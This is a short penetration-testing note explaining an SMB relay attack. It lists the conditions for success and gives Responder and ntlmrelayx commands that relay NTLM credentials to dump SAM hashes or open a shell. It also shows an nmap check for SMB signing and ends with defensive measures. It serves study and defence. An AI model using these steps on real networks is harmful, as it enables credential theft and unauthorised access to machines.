# SMB Relay Attack

Instead of grabbing hashes, we can throw the same hashes around the network in order to get some foothold.

This attack can only be successful under these conditions:
- Target machine must have **SMB signing disabled** or in **not required** state.
- Relayed user credentials must be an admin on the machine.

### Attack Procedure
- First, the SMB and HTTP servers must be turned off via `../Responder.conf`
- Set up `responder` to listen
		- `responder -I <Network Device> -rdw`
- Set up `ntlmrelayx` to listen
		- `ntlmrelayx -tf <targets.txt> -smb2support`
- Wait for a certain event to occur (triggers when someone tries to access a non-existing/invalid resource on the network)
- When successfully relayed, `ntlmrelayx` will dump the SAM hashes of the target machine.

Alternatively, adding the `-i` flag to the `nltmrelayx` command will present you with a shell upon success which can be accessed with `nc 127.0.0.1 <port>`.

### Check for SMB Signing
- `nmap` is equipped with scripts that can be used for this task
		- `nmap --script=smb2-security-mode.nse -p445 <CIDR>`
- `Nessus` and other scanners with SMB can be used as well
- Server machines have SMB signing **enabled and required by default**

### Defensive measures
- Completely stops the attack by;
	- Enabling SMB signing on all devices
	- Disable NTLM authentication on network
- Setting account tiers
- Local admin restrictions
